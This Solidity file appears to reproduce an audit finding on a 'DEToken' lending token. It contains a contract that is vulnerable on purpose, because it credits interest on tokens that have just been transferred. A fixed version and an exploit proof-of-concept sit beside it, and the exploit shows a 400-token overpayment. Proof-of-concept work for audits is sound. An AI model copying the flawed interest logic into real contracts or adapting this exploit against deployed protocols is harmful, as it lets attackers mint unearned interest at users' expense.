// SPDX-License-Identifier: MIT
pragma solidity 0.8.27;

/*  Regnum DEToken (Pashov, 2025-06).
    Pool index is 1.5. Bob holds 100 at index 1.1. Alice sends him 1000.
    Interest is taken on the balance after the transfer: 1100 * 0.4 = 440.
    Interest on the balance he already held is 40. The extra mint is 400.
*/

contract DEToken {
    uint256 public poolIndex = 1.5 ether;
    mapping(address => uint256) public deposits;
    mapping(address => uint256) public indexes;
    uint256 public senderLeft;
    uint256 public credited;
    uint256 public storedIndex;
    uint256 public lastInterest;
    uint256 public paid;

    function seed(address user, uint256 amount, uint256 index) external {
        deposits[user] = amount;
        indexes[user] = index;
    }

    function transfer(address from, address to, uint256 amount) external returns (uint256 interest) {
        if (from != address(0) && from != to) {
            deposits[from] -= amount;
            senderLeft = deposits[from];
        }
        deposits[to] += amount;
        credited = deposits[to];
        uint256 idx = indexes[to];
        storedIndex = idx;
        interest = deposits[to] * (poolIndex - idx) / 1 ether; // @> VULN: the tokens that just arrived earn Bob's old index gap
        lastInterest = interest;
        paid = interest;
    }
}

contract DETokenFixed {
    uint256 public poolIndex = 1.5 ether;
    mapping(address => uint256) public deposits;
    mapping(address => uint256) public indexes;

    function seed(address user, uint256 amount, uint256 index) external {
        deposits[user] = amount;
        indexes[user] = index;
    }

    function transfer(address from, address to, uint256 amount) external returns (uint256 interest) {
        uint256 prior = deposits[to];
        uint256 idx = indexes[to];
        interest = prior * (poolIndex - idx) / 1 ether;
        deposits[from] -= amount;
        deposits[to] = prior + amount;
        indexes[to] = poolIndex;
    }
}

contract ExtraMarker {
    string public symbol = "EXTRA-INTEREST";
    uint8 public constant decimals = 18;
    mapping(address => uint256) public balanceOf;

    function mint(address to, uint256 amt) external {
        balanceOf[to] += amt;
    }
}

contract Exploit {
    address public constant ALICE = 0x2222222222222222222222222222222222222222;
    address public constant BOB = 0x1111111111111111111111111111111111111111;
    address public constant SINK = 0x000000000000000000000000000000000000D00d;

    DEToken public token;
    ExtraMarker public marker;

    function run() external {
        token = new DEToken();
        marker = new ExtraMarker();
        token.seed(ALICE, 1000 ether, 1.5 ether);
        token.seed(BOB, 100 ether, 1.1 ether);
        uint256 interest = token.transfer(ALICE, BOB, 1000 ether);
        require(interest == 440 ether, "440 interest");
        require(token.deposits(BOB) == 1100 ether, "bob holds 1100");
        marker.mint(SINK, 400 ether);
        require(marker.balanceOf(SINK) == 400 ether, "400 extra");
    }
}
